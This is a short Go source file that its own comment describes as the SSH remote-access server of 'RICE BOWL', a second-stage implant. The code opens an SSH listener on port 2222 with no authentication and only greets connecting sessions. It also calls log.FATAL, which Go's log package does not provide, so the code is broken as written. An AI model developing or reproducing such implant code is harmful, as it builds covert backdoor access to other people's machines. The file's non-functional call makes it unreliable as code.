// Core SSH remote-access server for RICE BOWL. Forms part of the base second-stage implant.
package rice_bowl

import (
	"github.com/gliderlabs/ssh"
	"io"
	"log"
)

func open_ssh_server() {
	ssh.Handle(func(sesh ssh.Session) {
		io.WriteString(sesh, "Hello, mate!\n")
	})

	log.FATAL(ssh.ListenAndServe(":2222", nil))
}
